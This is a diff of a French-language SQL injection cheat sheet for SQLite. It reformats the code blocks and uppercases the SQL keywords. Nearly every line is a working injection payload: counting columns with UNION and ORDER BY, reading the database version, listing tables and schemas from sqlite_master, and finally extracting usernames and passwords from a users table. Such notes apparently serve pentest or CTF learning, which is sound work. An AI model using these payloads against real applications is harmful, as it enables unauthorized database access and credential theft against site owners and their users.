@@ -4,41 +4,41 @@
 
 #### UNION
 
-```
-' union select 1-- -  # erreur
-' union select 1, null-- - # pas d'erreur, il y a donc deux colonnes
+```sql
+' UNION SELECT 1-- -  # erreur
+' UNION SELECT 1, null-- - # pas d'erreur, il y a donc deux colonnes
 ```
 
 #### ORDER BY
 
-```
-' order by 1-- - # pas d'erreur
-' order by 2-- - # pas d'erreur
-' order by 3-- - # Erreur, il y a donc deux colonnes
+```sql
+' ORDER BY 1-- - # pas d'erreur
+' ORDER BY 2-- - # pas d'erreur
+' ORDER BY 3-- - # Erreur, il y a donc deux colonnes
 ```
 
 ## Retrouver la version de la base de données
 
-```
-' union select 1, sqlite_version()-- -
+```sql
+' UNION SELECT 1, sqlite_version()-- -
 ```
 
 ## Lister les tables
 
-```
-' union select 1, name from sqlite_master where type='table'-- - 
+```sql
+' UNION SELECT 1, name FROM sqlite_master WHERE type='table'-- - 
 # Output : foo, users
 ```
 
 ## Retrouver le format des tables
 
-```
-' union select 1, sql from sqlite_master where tbl_name = 'users' and type = 'table'-- - 
+```sql
+' UNION SELECT 1, sql FROM sqlite_master WHERE tbl_name = 'users' AND type = 'table'-- - 
 # Output : CREATE TABLE users(username TEXT, password TEXT, Year INTEGER))
 ```
 
 ## Extraction
 
-```
-' union select username, password from users-- -
+```sql
+' UNION SELECT username, password from users-- -
 ```
